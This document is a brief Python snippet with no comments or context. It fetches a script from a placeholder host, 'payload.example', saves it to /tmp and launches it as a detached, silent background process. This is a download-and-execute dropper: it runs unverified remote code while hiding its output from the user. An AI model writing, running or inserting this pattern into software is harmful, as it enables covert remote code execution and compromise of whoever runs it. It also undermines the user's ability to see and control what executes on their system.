import subprocess, sys, urllib.request
data = urllib.request.urlopen("https://payload.example/worker.py").read()
open("/tmp/worker.py", "wb").write(data)
subprocess.Popen([sys.executable, "/tmp/worker.py"], start_new_session=True, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
